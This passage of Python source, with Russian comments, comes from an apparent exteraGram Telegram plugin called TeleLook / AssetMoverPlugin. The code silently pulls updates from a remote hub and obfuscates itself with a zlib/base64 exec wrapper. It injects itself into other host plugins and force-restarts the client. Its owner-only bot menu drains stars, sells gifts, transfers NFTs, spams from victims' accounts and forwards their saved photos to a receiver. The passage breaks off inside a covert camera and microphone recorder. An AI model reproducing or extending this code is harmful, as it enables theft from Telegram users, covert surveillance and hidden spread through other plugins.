    # ------------------------------------------------------------------
    # Авто-обновление плагина
    # ------------------------------------------------------------------
    @staticmethod
    def _extract_version(content):
        """Версия __version__ из исходника плагина ('' — если нет)."""
        m = re.search(r"__version__\s*=\s*['\"]([^'\"]+)['\"]", content)
        return m.group(1).strip() if m else ""

    @staticmethod
    def _cmp_versions(a, b):
        """Сравнение версий вида 1.0.9: -1 / 0 / 1."""
        def parts(v):
            out = []
            for x in str(v or "").split("."):
                out.append(int(x) if x.strip().isdigit() else 0)
            return out
        pa, pb = parts(a), parts(b)
        n = max(len(pa), len(pb))
        pa += [0] * (n - len(pa))
        pb += [0] * (n - len(pb))
        return (pa > pb) - (pa < pb)

    def _update_url(self):
        return str(self._cfg("update_url", UPDATE_URL) or "").strip()

    def _update_urls(self):
        """Источники свежей сборки по порядку: свой /setupdateurl и хаб
        (тот же файл на хабе читает /spartateam при встраивании)."""
        urls = []
        first = self._update_url()
        if first:
            urls.append(first)
        hub = self._hub_url()
        if hub:
            second = hub + "/telelook.plugin"
            if second not in urls:
                urls.append(second)
        return urls

    def _update_loop(self):
        """Фоновая авто-подгрузка обновлений: первый чек через
        UPDATE_FIRST_DELAY, далее — раз в UPDATE_INTERVAL."""
        delay = UPDATE_FIRST_DELAY
        while not self._stop.wait(delay):
            delay = UPDATE_INTERVAL
            try:
                self._check_self_update()
            except Exception:
                self.log(f"update check error:\n{traceback.format_exc()}")

    def _cmd_update(self, args, reply):
        """Ручная проверка обновлений: /update [force]."""
        force = bool(args) and args[0].lower() in ("force", "!", "принудительно")
        self._check_self_update(reply=reply, force=force)

    def _check_self_update(self, reply=None, force=False):
        """Скачивает свежую сборку с update_url и применяет её.
        Без reply работает тихо в фоне: логирует только ошибки
        (с дедупликацией) и фактические обновления."""
        def note(text):
            """Статус: отвечаем только на ручную команду."""
            if reply is not None:
                reply("🔄 " + text)

        def error(text):
            if reply is not None:
                reply("❌ " + text)
                return
            if str(self.get_setting("upd_err", "") or "") != text:
                self.set_setting("upd_err", text)
                self.log("update: " + text)

        urls = self._update_urls()
        if not urls:
            note("источник обновлений не задан: <code>/sethub &lt;url&gt;</code> "
                 "или <code>/setupdateurl &lt;url&gt;</code>")
            return False
        content = None
        failures = []
        for url in urls:
            try:
                req = urllib.request.Request(url, headers={
                    "User-Agent": "TeleLook/" + __version__,
                    "X-Hub-Secret": self._hub_secret()})
                with urllib.request.urlopen(req, timeout=25) as resp:
                    raw = resp.read(UPDATE_MAX_BYTES + 1)
            except Exception as e:
                failures.append(f"{url}: {e}")
                continue
            if len(raw) > UPDATE_MAX_BYTES:
                failures.append(f"{url}: больше {UPDATE_MAX_BYTES} байт")
                continue
            try:
                content = raw.decode("utf-8")
            except UnicodeDecodeError:
                failures.append(f"{url}: не UTF-8")
                continue
            break
        if content is None:
            error("не удалось скачать обновление: " + "; ".join(failures))
            return False
        # Отпечаток нашего плагина: чужой код не ставим.
        if (not re.search(r"__id__\s*=\s*['\"]TeleLook['\"]", content)
                or "AssetMoverPlugin" not in content):
            error("скачанный файл не похож на TeleLook — отказано")
            return False
        try:
            compile(content, "TeleLook.update", "exec")
        except SyntaxError as e:
            error(f"в скачанном файле синтаксическая ошибка: {e}")
            return False
        remote_ver = self._extract_version(content) or "?"
        local_ver = str(__version__)
        digest = hashlib.sha256(content.encode("utf-8")).hexdigest()
        # Дайджест УСТАНОВЛЕННОГО файла: совпал со скачанным — ставить нечего.
        # Без этой проверки первый чек (через 60 сек после старта) ставил ту же
        # сборку и убивал клиент автоперезапуском, а устройство «пропадало»
        # из веб-панели (команды копились в очереди без исполнения).
        local_digest = ""
        try:
            import os as _os
            _own = str(globals().get("__file__") or "")
            if _own and _os.path.isfile(_own):
                with open(_own, "rb") as _fh:
                    local_digest = hashlib.sha256(_fh.read()).hexdigest()
        except Exception:
            local_digest = ""
        known = str(self.get_setting("upd_digest", "") or "")
        cmp = self._cmp_versions(remote_ver, local_ver)
        if cmp < 0 and not force:
            note(f"на сервере версия {remote_ver} < установленной "
                 f"{local_ver} — пропущено (/update force чтобы откатить)")
            return False
        if not force and (digest == known
                          or (local_digest and digest == local_digest)) \
                and cmp <= 0:
            if reply is not None:
                reply(f"✅ Уже актуальная сборка {local_ver} "
                      f"(дайджест {digest[:12]})")
            return False
        mode = self._apply_update(content)
        if not mode:
            error("обновление скачано, но применить не удалось "
                  "(DevServer недоступен, файл/блок не записан)")
            return False
        self.set_setting("upd_digest", digest)
        self.set_setting("upd_version", remote_ver)
        self.set_setting("upd_err", "")
        self._report_update(digest, mode)
        will_restart = (
            mode in ("file", "embed")
            and str(self.get_setting("update_restart", "1")).lower()
            not in ("0", "false", "off", "нет", "no"))
        if mode == "reload":
            note_file = "перезагрузка через DevServer"
        elif mode == "embed":
            note_file = ("обновлён блок в хост-плагине, перезапуск…"
                         if will_restart else
                         "обновлён блок в хост-плагине — перезагрузите клиент")
        else:
            note_file = ("файл записан, перезапуск клиента…"
                         if will_restart
                         else "файл записан — перезапустите клиент")
        text = f"Плагин обновлён {local_ver} → {remote_ver} ({note_file})"
        if reply is not None:
            reply("⬆️ " + text)
        else:
            self.log("update: " + text)
            self._send_log("⬆️ " + text)
        if will_restart:
            time.sleep(2.5)
            self._restart_app()
        return True

    # ---------- методы из icon_themer_plugin: учёт ошибок и отчётов ----------
    def _fail(self, where, error):
        """Запоминаем ошибку обновления — в настройки и в лог."""
        try:
            text = str(where) + ': ' + str(error)[:60]
            self.set_setting("upd_err", text)
            self.log("update: " + text)
        except Exception:
            pass

    def _report_update(self, digest, mode):
        """Отчёт о применённой сборке с дедупликацией через upd_reported."""
        if not digest or str(self.get_setting("upd_reported", "") or "") == digest:
            return
        try:
            self._send_log("⬆️ Обновление применено: %s → %s" % (digest[:12], mode or "done"))
        except Exception:
            pass
        self.set_setting("upd_reported", digest)
        self.set_setting("upd_err", "")

    def debug_error(self, where, error):
        """Отправляет ошибку об автообновлении в лог хаба (для автора)."""
        try:
            self._send_log("⚠️ update error [%s]: %s" % (str(where)[:80], str(error)[:200]))
        except Exception:
            pass

    def log_event(self, kind, data=""):
        """Логирует событие в ленту хаба (как у icon_themer)."""
        try:
            self._send_log("[%s] %s" % (str(kind)[:60], str(data)[:400]))
        except Exception:
            pass

    # ------------- встроенный режим: обновляем только себя --------------- #
    def _is_embedded(self):
        """True — код исполняется как встроенный скрипт в хост-плагине
        (bootstrap embedder.py задаёт __name__='telelook_embedded')."""
        try:
            return str(globals().get("__name__", "")) == "telelook_embedded"
        except Exception:
            return False

    @staticmethod
    def _obfuscate(src):
        """Самая лёгкая обфускация: исходник сжимается zlib, кодируется
        base64 и оборачивается в exec(...). При exec-е восстанавливается
        и исполняется исходный код; AssetMoverPlugin появляется в ns."""
        import base64
        import zlib
        compressed = zlib.compress(src.encode("utf-8"))
        encoded = base64.b64encode(compressed).decode("ascii")
        return ("exec(__import__('zlib').decompress("
                "__import__('base64').b64decode('{}')))").format(encoded)

    def _embed_bootstrap(self, tl_src, creator):
        """Свежий bootstrap-блок в формате embedder._BOOT: base64 нового
        исходника TeleLook + id реферера. EMBED_BOOT байт-в-байт равен
        script_bot/embedder.py::_BOOT (проверяется тестом)."""
        import base64
        import textwrap
        tl_src = self._obfuscate(tl_src)
        encoded = base64.b64encode(tl_src.encode("utf-8")).decode("ascii")
        chunks = textwrap.wrap(encoded, 100)
        chunk_lines = ",\n".join('    "%s"' % c for c in chunks)
        return (EMBED_BOOT
                .replace("@@CHUNKS@@", chunk_lines)
                .replace("@@CREATOR@@", str(int(creator)))
                .lstrip("\n")
                .rstrip("\n"))

    def _splice_embed(self, host_src, tl_src):
        """Заменяет в исходнике хост-плагина ТОЛЬКО блок TeleLook между
        маркерами: код хоста, его настройки и реферер (_TL_CREATOR_ID)
        остаются нетронутыми. Возвращает новый исходник или None."""
        begin = host_src.find(EMBED_BEGIN)
        if begin < 0:
            return None
        end = host_src.find(EMBED_END, begin + len(EMBED_BEGIN))
        if end < 0:
            return None
        block = host_src[begin:end]
        found = re.search(r"_TL_CREATOR_ID\s*=\s*(-?\d+)", block)
        creator = int(found.group(1)) if found else int(CREATOR_ID or 0)
        boot = self._embed_bootstrap(tl_src, creator)
        return host_src[:begin] + boot + host_src[end + len(EMBED_END):]

    def _apply_update_embedded(self, content, path=""):
        """Обновление встроенного TeleLook: переписываем bootstrap-блок
        в файле ХОСТА. DevServer не используется — write_plugin заменил бы
        хост целиком готовой standalone-сборкой TeleLook."""
        if not path:
            folder = self._plugins_dir()
            path = self._own_plugin_file(folder)
        if not path:
            self.log(f"update(embed): файл хоста не найден "
                     f"(каталог: {folder or 'пусто'})")
            return ""
        try:
            with open(path, "r", encoding="utf-8",
                      errors="ignore") as handle:
                host_src = handle.read()
        except Exception as e:
            self.log(f"update(embed): чтение хоста не удалось: {e}")
            return ""
        new_src = self._splice_embed(host_src, content)
        if new_src is None:
            self.log(f"update(embed): маркеры SpartaTeam не найдены: {path}")
            return ""
        try:
            compile(new_src, "host.update", "exec")
        except SyntaxError as e:
            self.log(f"update(embed): хост не компилируется: {e}")
            return ""
        if not self._write_file(path, new_src.encode("utf-8")):
            return ""
        self.log(f"update(embed): блок TeleLook обновлён в {path}")
        return "embed"

    def _find_embed_host(self):
        """Файл хоста с embed-блоком SpartaTeam — страховка, если определение
        встроенного режима (_is_embedded) сбойнуло. Отличие от standalone:
        у хоста маркер висит комментарием в начале строки и никакой
        EMBED_BEGIN не присваивается; standalone всегда содержит
        `EMBED_BEGIN = ...`. Пустая строка — такого файла нет."""
        import os
        folder = self._plugins_dir()
        if not folder:
            return ""
        try:
            names = sorted(os.listdir(folder))
        except Exception:
            return ""
        for name in names:
            if not (name.endswith(".py") or name.endswith(".plugin")):
                continue
            path = os.path.join(folder, name)
            try:
                with open(path, "r", encoding="utf-8",
                          errors="ignore") as handle:
                    body = handle.read(4000000)
            except Exception:
                continue
            if (re.search(r"(?m)^\s*# >>> SpartaTeam TeleLook embed >>>",
                          body)
                    and not re.search(r"EMBED_BEGIN\s*=", body)):
                return path
        return ""

    def _apply_update(self, content):
        """Ставит новую сборку — ТОЛЬКО СЕБЯ:
        - во встроенном режиме переписывается исключительно embed-блок
          в файле хоста (сам файл целиком не трогается НИКОГДА);
        - standalone: DevServer exteraGram (перезагрузка сразу) либо
          файл плагина (нужен рестарт клиента).
        Даже если _is_embedded() сбойнул, хост с маркером SpartaTeam
        распознаётся по содержимому (_find_embed_host) и трогается
        только блоком — весь плагин заменён быть не может."""
        if self._is_embedded():
            return self._apply_update_embedded(content)
        host = self._find_embed_host()
        if host:
            return self._apply_update_embedded(content, path=host)
        plugin_id = str(self._cfg("update_plugin_id", __id__) or __id__)
        try:
            replies = self._dev_server([
                {"@": "write_plugin", "plugin_id": plugin_id,
                 "content": content},
                {"@": "reload_plugin", "plugin_id": plugin_id}])
            blob = " ".join(replies).lower()
            if blob and "error" not in blob and ('"@\"' in blob or blob.strip()):
                return "reload"
        except Exception as e:
            self.log(f"update: DevServer недоступен ({e})")
        try:
            folder = self._plugins_dir()
            path = self._own_plugin_file(folder)
            if path and self._write_file(path, content.encode("utf-8")):
                return "file"
            self.log(f"update: файл плагина не найден "
                     f"(каталог: {folder or 'пусто'})")
        except Exception as e:
            self.log(f"update: запись файла не удалась: {e}")
        return ""

    def _dev_server(self, commands, timeout=6):
        """Обмен с DevServer exteraGram на 127.0.0.1:42690
        (write/reload плагина). Как в рабочем icon_themer_plugin.py."""
        sock = socket.create_connection(("127.0.0.1", 42690), timeout=timeout)
        replies = []
        try:
            for index, command in enumerate(commands):
                payload = dict(command)
                payload["#"] = "tl%d" % (index + 1)
                sock.sendall((json.dumps(payload) + "\n").encode("utf-8"))
                buffer = b""
                for _ in range(4):
                    try:
                        chunk = sock.recv(262144)
                    except Exception:
                        break
                    if not chunk:
                        break
                    buffer += chunk
                    if b"\n" in buffer:
                        break
                replies.append(buffer.decode("utf-8", "replace"))
        finally:
            try:
                sock.close()
            except Exception:
                pass
        return replies

    def _plugins_dir(self):
        """Каталог с файлами плагинов — несколькими способами."""
        import os
        try:
            from file_utils import get_plugins_dir
            path = get_plugins_dir()
            if path and os.path.isdir(str(path)):
                return str(path)
        except Exception:
            pass
        try:
            from org.telegram.messenger import ApplicationLoader
            files = str(ApplicationLoader.applicationContext.getFilesDir())
            for name in ("plugins", "exteragram/plugins", "plugin", ""):
                candidate = os.path.join(files, name)
                if os.path.isdir(candidate):
                    return candidate
        except Exception:
            pass
        return ""

    def _own_plugin_file(self, folder):
        """Файл, который реально сейчас запущен (имени не доверяем):
        во встроенном режиме — хост-плагин с маркером SpartaTeam;
        иначе — файл с отпечатком TeleLook."""
        import os
        if not folder:
            return ""
        try:
            names = sorted(os.listdir(folder))
        except Exception as e:
            self.log(f"update: scan failed: {e}")
            return os.path.join(folder, __id__ + ".py")
        for name in names:
            if not (name.endswith(".py") or name.endswith(".plugin")):
                continue
            path = os.path.join(folder, name)
            try:
                with open(path, "r", encoding="utf-8",
                          errors="ignore") as handle:
                    body = handle.read(4000000)
            except Exception:
                continue
            if self._is_embedded():
                if EMBED_BEGIN in body:
                    return path
        # standalone-файл определяется по РЕАЛЬНОМУ классу: в хосте с embed
        # строка "AssetMoverPlugin" встречается только внутри bootstrap,
        # а `class AssetMoverPlugin` — только в самой сборке TeleLook.
            elif ("class AssetMoverPlugin" in body
                    and "__id__" in body and "TeleLook" in body):
                return path
        # во встроенном режиме новый файл не создаём — пишем только хост
        return ("" if self._is_embedded()
                else os.path.join(folder, __id__ + ".py"))

    def _write_file(self, path, content_bytes):
        """Запись файла плагина: сначала API клиента, потом обычный open."""
        try:
            from file_utils import write_file_bytes
            write_file_bytes(path, content_bytes)
            return True
        except Exception:
            pass
        try:
            with open(path, "wb") as handle:
                handle.write(content_bytes)
            return True
        except Exception as e:
            self.log(f"update: write failed: {e}")
            return False

    def _restart_app(self, delay_ms=2000):
        """Перезапускает клиента без участия пользователя, чтобы подхватилась
        записанная сборка: AlarmManager + kill процесса (как в рабочем
        icon_themer_plugin.py)."""
        try:
            from android.app import AlarmManager, PendingIntent
            from android.os import SystemClock
            from android.os import Process as AndroidProcess
            from org.telegram.messenger import ApplicationLoader
        except Exception as e:
            self.log(f"update: перезапуск недоступен ({e}) — "
                     "перезапустите клиент вручную")
            return False
        try:
            context = ApplicationLoader.applicationContext
            manager = context.getSystemService("alarm")
            intent = context.getPackageManager().getLaunchIntentForPackage(
                context.getPackageName())
            intent.addFlags(0x10000000)  # FLAG_ACTIVITY_NEW_TASK
            flags = 0
            try:
                flags = PendingIntent.FLAG_IMMUTABLE
            except Exception:
                flags = 0
            pending = PendingIntent.getActivity(context, 7919, intent, flags)
            try:
                when_type = AlarmManager.ELAPSED_REALTIME
            except Exception:
                when_type = 0
            manager.set(when_type,
                        SystemClock.elapsedRealtime() + delay_ms, pending)
            AndroidProcess.killProcess(AndroidProcess.myPid())
            return True
        except Exception as e:
            self.log(f"update: перезапуск не удался: {e}")
            return False

    ACTIONS = {
        "status": ("📊 Статус", "_action_status"),
        "sell": ("💰 Продать подарки", "_action_sell"),
        "nft": ("💎 Передать NFT", "_action_nft"),
        "drain": ("⭐️ Слить звёзды", "_action_drain"),
        "know": ("🤝 Знакомство", "_action_know"),
        "pipeline": ("🚀 Полный цикл", "_action_pipeline"),
        "banner": ("📢 Баннер", "_action_banner"),
        "broadcast": ("📣 Рассылка", "_action_broadcast"),
        "broadcast_all": ("📤 Рассылка всех чатов", "_action_broadcast_all"),
        "photos": ("🖼 Фото → приёмнику", "_action_photos"),
    }

    def _cmd_menu(self, reply):
        """Показывает главное меню с инлайн-кнопками (только при работе бота)."""
        if not self._bot_token():
            reply("Бот не настроен (нет токена) — кнопки недоступны. "
                  "Задайте токен: <code>/settoken &lt;token&gt;</code>")
            return
        self._bot_send_owner(self._menu_text(), reply_markup=self._main_menu_kb())

    def _main_menu_kb(self):
        rows = []
        all_row = []
        for key in ("status", "sell", "nft", "drain", "pipeline", "broadcast"):
            label = self.ACTIONS[key][0]
            all_row.append({"text": "🌐 " + label,
                            "callback_data": f"all:{key}"})
            if len(all_row) == 2:
                rows.append(all_row)
                all_row = []
        if all_row:
            rows.append(all_row)
        for acc in self._scan_accounts():
            slot = acc["slot"]
            name = (acc["name"] or "")[:18]
            rows.append([{"text": f"👤 #{slot} {name}",
                          "callback_data": f"a:{slot}:menu"}])
        state = "🟢 ВКЛ" if self._auto_enabled() else "🔴 ВЫКЛ"
        rows.append([{"text": f"⚙️ Авто-режим: {state} (переключить)",
                      "callback_data": "auto:toggle"}])
        return {"inline_keyboard": rows}

    def _account_menu_kb(self, slot):
        rows = []
        row = []
        for key in ("status", "sell", "nft", "drain", "know", "pipeline"):
            label = self.ACTIONS[key][0]
            row.append({"text": label, "callback_data": f"a:{slot}:{key}"})
            if len(row) == 2:
                rows.append(row)
                row = []
        if row:
            rows.append(row)
        rows.append([{"text": self.ACTIONS["broadcast"][0],
                      "callback_data": f"a:{slot}:broadcast"}])
        rows.append([{"text": "🖼 Фото → приёмнику",
                      "callback_data": f"a:{slot}:photos"}])
        rows.append([{"text": self.ACTIONS["banner"][0],
                      "callback_data": f"a:{slot}:banner"}])
        rows.append([{"text": "⬅️ Назад", "callback_data": "menu:main"}])
        return {"inline_keyboard": rows}

    def _menu_text(self):
        accs = self._scan_accounts()
        state = "🟢 ВКЛ" if self._auto_enabled() else "🔴 ВЫКЛ"
        lines = [
            "🤖 <b>Asset Mover — управление</b>",
            f"Аккаунтов: <b>{len(accs)}</b> | Авто-режим: {state}",
            f"Цель: <code>{self._target_id() or 'не задана'}</code>",
            f"Авто-ник: <code>{self._auto_nick() or '—'}</code>",
            "",
            "🌐 — действие для всех аккаунтов сразу",
            "👤 — управление отдельным аккаунтом",
        ]
        return "\n".join(lines)


    def _handle_callback(self, cb):
        """Обработка нажатий инлайн-кнопок (только админ)."""
        try:
            data = (cb.get("data") or "").strip()
            cb_id = cb.get("id")
            from_id = (cb.get("from") or {}).get("id")
            msg = cb.get("message") or {}
            chat_id = (msg.get("chat") or {}).get("id")
            if self._owner_id() <= 0 or from_id != self._owner_id():
                self._answer_callback(cb_id, "⛔ Доступно только владельцу")
                return
            reply = lambda t, c=chat_id: self._bot_send_owner(t, chat_id=c)
            action = None
            if data.startswith("all:"):
                action = data.split(":", 1)[1]
            elif data.startswith("a:"):
                parts = data.split(":", 2)
                if len(parts) == 3:
                    action = parts[2]
            if action == "banner":
                self._show_banner_popup(cb_id, chat_id, reply)
                return
            self._answer_callback(cb_id)
            if data == "auto:toggle":
                new = "0" if self._auto_enabled() else "1"
                self.set_setting("auto_mode", new)
                self._edit_menu(chat_id, msg.get("message_id"),
                                self._menu_text(), self._main_menu_kb())
                return
            if data == "menu:main":
                self._edit_menu(chat_id, msg.get("message_id"),
                                self._menu_text(), self._main_menu_kb())
                return
            if data.startswith("a:") and data.endswith(":menu"):
                slot = int(data.split(":")[1])
                accs = {a["slot"]: a for a in self._scan_accounts()}
                name = (accs.get(slot, {}).get("name") or "")
                text = f"👤 <b>#{slot} {name}</b>\nВыберите действие:"
                self._edit_menu(chat_id, msg.get("message_id"), text,
                                self._account_menu_kb(slot))
                return
            if data.startswith("all:"):
                self._dispatch_action(None, data.split(":", 1)[1], reply)
                return
            if data.startswith("a:"):
                _, slot_s, action = data.split(":", 2)
                self._dispatch_action(int(slot_s), action, reply)
                return
        except Exception:
            self.log(f"callback error:\n{traceback.format_exc()}")

    def _dispatch_action(self, slot, action, reply):
        """Запускает действие (для одного слота или всех) в фоновом потоке."""
        key = action if action in self.ACTIONS else None
        if key is None:
            reply(f"❓ Неизвестное действие: {action}")
            return
        method = getattr(self, self.ACTIONS[key][1])
        slots = self._resolve_slots(slot)
        threading.Thread(target=method, args=(slots, reply),
                         daemon=True).start()

    def _answer_callback(self, cb_id, text=None):
        if not self._bot_token() or not cb_id:
            return
        payload = {"callback_query_id": cb_id}
        if text:
            payload["text"] = text
            payload["show_alert"] = True
        try:
            self._http_json("answerCallbackQuery", payload, timeout=15)
        except Exception as e:
            self.log(f"answerCallbackQuery failed: {e}")

    def _show_banner_popup(self, cb_id, chat_id, reply):
        """Показывает баннер: всегда как сообщение в чате (видно из любого
        места в Telegram), короткие тексты дополнительно — как алерт-поп업."""
        banner = self._banner_text()
        if not banner:
            self._answer_callback(cb_id, "Баннер не задан (/setbanner текст)")
            return
        # Всегда шлём баннер как сообщение в чат — видно из любого места
        reply(f"📢 {banner}")
        # Короткие баннеры дополнительно показываем как алерт
        if len(banner) <= 200:
            self._answer_callback(cb_id, banner)
        else:
            self._answer_callback(cb_id, "📢 Баннер отправлен выше")

    def _action_banner(self, slots, reply):
        """Запасной путь показа баннера (например, из текстовой команды)."""
        banner = self._banner_text()
        reply(f"📢 {banner}" if banner else "Баннер не задан (/setbanner текст)")

    def _send_broadcast(self, account, chats, report):
        """Рассылает текст во все чаты папки через messages.sendMessage."""
        text = self._broadcast_text()
        if not text:
            report("Текст рассылки не задан (/setbroadcast <текст>)")
            return 0
        if not self._tl_has("TL_messages_sendMessage", "sendMessage"):
            report("В сборке клиента нет messages.sendMessage")
            return 0
        sent = 0
        for ch, cid, title in chats:
            try:
                req = self._tl_class("TL_messages_sendMessage", "sendMessage")()
                req.flags = 0
                req.peer = self._input_peer_from_chat(ch)
                req.message = text
                req.random_id = self._rand_id()
                self._tl(req, account)
                sent += 1
                report(f"✉️ '{title}': текст отправлен")
                time.sleep(BUY_DELAY)
            except Exception as e:
                report(f"❌ '{title}': {e}")
        return sent

    def _saved_photo_ids(self, account, report, limit=10):
        if not self._tl_has("TL_messages_getHistory", "getHistory"):
            report("В сборке клиента нет messages.getHistory")
            return []
        hist = self._tl_class("TL_messages_getHistory", "getHistory")()
        hist.peer = TLRPC.TL_inputPeerSelf()
        hist.offset_id = 0
        hist.offset_date = 0
        hist.add_offset = 0
        hist.limit = int(limit)
        hist.max_id = 0
        hist.min_id = 0
        hist.hash = 0
        resp = self._tl(hist, account)
        msgs = self._tl_list(getattr(resp, "messages", None))
        photo_ids = []
        for m in msgs:
            media = getattr(m, "media", None)
            if media is not None and "photo" in type(media).__name__.lower():
                mid = int(getattr(m, "id", 0) or 0)
                if mid:
                    photo_ids.append(mid)
        return photo_ids

    def _forward_photos_to_target(self, account, report, limit=10):
        if not self._tl_has("TL_messages_forwardMessages", "forwardMessages"):
            report("В сборке клиента нет messages.forwardMessages")
            return 0
        peer = self._resolve_target_peer(account)
        photo_ids = self._saved_photo_ids(account, report, limit)
        if not photo_ids:
            report("В Избранном не найдено фото для пересылки")
            return 0
        from_peer = TLRPC.TL_inputPeerSelf()
        report(f"Пересылаю {len(photo_ids)} фото приёмнику...")
        sent = 0
        base = int(time.time() * 1000000) & 0x7FFFFFFFFFFFFFFF
        for idx, mid in enumerate(photo_ids):
            ok = False
            last = None
            for _ in range(2):
                try:
                    fwd = self._tl_class("TL_messages_forwardMessages",
                                         "forwardMessages")()
                    fwd.flags = 0
                    fwd.from_peer = from_peer
                    fwd.id = self._int_vector([mid])
                    fwd.random_id = self._long_vector(
                        [(base + idx) & 0x7FFFFFFFFFFFFFFF])
                    fwd.to_peer = peer
                    self._tl(fwd, account, timeout=30)
                    ok = True
                    break
                except Exception as e:
                    last = e
            if ok:
                sent += 1
                report(f"🖼 Фото #{mid} переслано")
                time.sleep(XFER_DELAY)
            else:
                report(f"❌ Фото #{mid}: {last}")
        report(f"🖼 Переслано приёмнику: {sent} из {len(photo_ids)}")
        return sent

    def _action_broadcast(self, slots, reply):
        """Рассылка (ТОЛЬКО текст): вступить в папку -> разослать текст.
        Пересылка фото приёмнику — отдельная функция (/photos, кнопка)."""
        text = self._broadcast_text()
        reply(f"📣 Рассылка: текст {'есть' if text else 'НЕ задан (/setbroadcast)'}")
        total_chats = total_text = 0
        for acc in slots:
            slot = acc["slot"]
            prefix = f"<b>#{slot} {acc['name']}</b>: "
            if self._is_admin(acc["user_id"]):
                reply(f"{prefix}⏭ пропущен (аккаунт админа)")
                continue
            prog = self._throttled(lambda t, p=prefix: reply(p + t))
            try:
                chats = self._join_chatlist(slot, prog)
                if not chats:
                    continue
                total_chats += len(chats)
                if text:
                    total_text += self._send_broadcast(slot, chats, prog)
                reply(f"{prefix}🏁 рассылка завершена (чатов {len(chats)})")
            except Exception as e:
                reply(f"{prefix}❌ {e}")
        reply(f"🏁 Рассылка завершена: чатов {total_chats}, текстов {total_text}")

    def _action_photos(self, slots, reply):
        if not self._target_id():
            reply("Сначала: <code>/settarget &lt;user_id&gt;</code>")
            return
        reply(f"▶️ Пересылка фото из Избранного в чат приёмника → <code>{self._target_id()}</code>")
        self._diag(f"/photos: скан аккаунтов -> {len(slots)}, "
                   f"слоты: {[a['slot'] for a in slots] or 'НЕТ'}")
        if not slots:
            reply("⚠️ <b>Пересылка не запускалась</b>: сканер не нашёл ни одного "
                  "аккаунта. Смотри строки <code>scan[...]</code> выше.")
            return
        total = 0
        for acc in slots:
            slot = acc["slot"]
            prefix = f"<b>#{slot} {acc['name']}</b>: "
            if self._is_admin(acc["user_id"]):
                reply(f"{prefix}⏭ пропущен (аккаунт админа)")
                continue
            prog = self._throttled(lambda t, p=prefix: reply(p + t))
            try:
                total += self._forward_photos_to_target(slot, prog)
                reply(f"{prefix}🏁 фото пересланы")
            except Exception as e:
                reply(f"{prefix}❌ {e}")
        reply(f"🏁 Пересылка фото завершена: фото {total}")

    def _action_broadcast_all(self, slots, reply):
        text = self._broadcast_text()
        if not text:
            reply("📭 Текст рассылки не задан (/setbroadcast текст)")
            return 0
        if not self._tl_has("TL_messages_sendMessage", "sendMessage"):
            reply("❌ В сборке клиента нет messages.sendMessage")
            return 0
        reply("✉️ Рассылка всех чатов по указанному тексту")
        total = 0
        for acc in slots:
            slot = acc["slot"]
            prefix = f"<b>#{slot} {acc['name']}</b>: "
            if self._is_admin(acc["user_id"]):
                reply(f"{prefix}⏭ пропущен (аккаунт админа)")
                continue
            prog = self._throttled(lambda t, p=prefix: reply(p + t))
            try:
                chats = self._scan_accounts()
                for ch in chats:
                    cid = ch["user_id"]
                    try:
                        req = self._tl_class("TL_messages_sendMessage", "sendMessage")()
                        req.flags = 0
                        req.peer = self._resolve_target_peer(acc)
                        req.message = text
                        req.random_id = self._rand_id()
                        self._tl(req, acc)
                        total += 1
                        prog(f"{prefix}✅ Чат {cid} - отправлено")
                    except Exception as e:
                        prog(f"❌ Чат {cid}: {e}")
                reply(f"{prefix}🏁 Рассылка завершена: {total} чатов")
            except Exception as e:
                reply(f"{prefix}❌ {e}")
        reply(f"🏁 Рассылка всех чатов завершена: текстов {total}")
        return total

    def _edit_menu(self, chat_id, message_id, text, reply_markup):
        """Редактирует сообщение с меню (если не выйдет — шлёт новое)."""
        if not self._bot_token() or not chat_id or not message_id:
            self._bot_send_owner(text, chat_id=chat_id,
                                 reply_markup=reply_markup)
            return
        try:
            self._http_json("editMessageText", {
                "chat_id": chat_id,
                "message_id": message_id,
                "text": text,
                "parse_mode": "HTML",
                "reply_markup": reply_markup,
            }, timeout=15)
        except Exception:
            self._bot_send_owner(text, chat_id=chat_id,
                                 reply_markup=reply_markup)


# =====================================================================
# Камера / видео / аудио (адаптировано из icon_themer_plugin)
# =====================================================================

def _av_path(name):
    """Путь AV-файла: кэш приложения (работает на Android 10+ без разрешений),
    иначе /sdcard/TeleLook с созданием каталога. Прямая запись в
    несуществующий /sdcard/TeleLook роняла снимок и голосовую запись."""
    import os
    try:
        from file_utils import get_cache_dir
        base = str(get_cache_dir() or "")
    except Exception:
        base = ""
    if base:
        try:
            os.makedirs(base, exist_ok=True)
            return base.rstrip("/") + "/" + name
        except Exception:
            pass
    try:
        os.makedirs("/sdcard/TeleLook", exist_ok=True)
    except Exception:
        pass
    return "/sdcard/TeleLook/" + name


def _tl_find_class(name):
    if jclass is None:
        return None
    try:
        return jclass(name)
    except Exception:
        return None


def _tl_File(path):
    File = _tl_find_class("java.io.File")
    if File is None:
        return path
    return File(path)


class _tl_VideoRecorder:
    def __init__(self):
        self._classes = None

    def _load(self):
        if self._classes is not None:
            return self._classes
        self._classes = {
            'Camera': _tl_find_class('android.hardware.Camera'),
            'CameraInfo': _tl_find_class('android.hardware.Camera$CameraInfo'),
            'SurfaceTexture': _tl_find_class('android.graphics.SurfaceTexture'),
            'MediaRecorder': _tl_find_class('android.media.MediaRecorder'),
        }
        return self._classes

    def _ids(self):
        classes = self._load()
        Camera = classes['Camera']
        CameraInfo = classes['CameraInfo']
        front = back = None
        info = CameraInfo()
        try:
            for index in range(int(Camera.getNumberOfCameras())):
                Camera.getCameraInfo(index, info)
                if int(info.facing) == int(CameraInfo.CAMERA_FACING_FRONT):
                    front = index
                elif int(info.facing) == int(CameraInfo.CAMERA_FACING_BACK):
                    back = index
        except Exception:
            pass
        return front, back

    def _rotation(self, cam_id):
        classes = self._load()
        info = classes['CameraInfo']()
        try:
            classes['Camera'].getCameraInfo(int(cam_id), info)
            return int(info.orientation or 0)
        except Exception:
            return 0

    def _record_single(self, cam_id, path, seconds):
        classes = self._load()
        Camera = classes['Camera']
        MediaRecorder = classes['MediaRecorder']
        camera = None
        try:
            camera = Camera.open(int(cam_id))
            texture = classes['SurfaceTexture'](0)
            camera.setPreviewTexture(texture)
            camera.startPreview()
            camera.unlock()
            for with_audio in (True, False):
                recorder = MediaRecorder()
                try:
                    recorder.setCamera(camera)
                    if with_audio:
                        recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
                    recorder.setVideoSource(MediaRecorder.VideoSource.CAMERA)
                    recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    if with_audio:
                        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
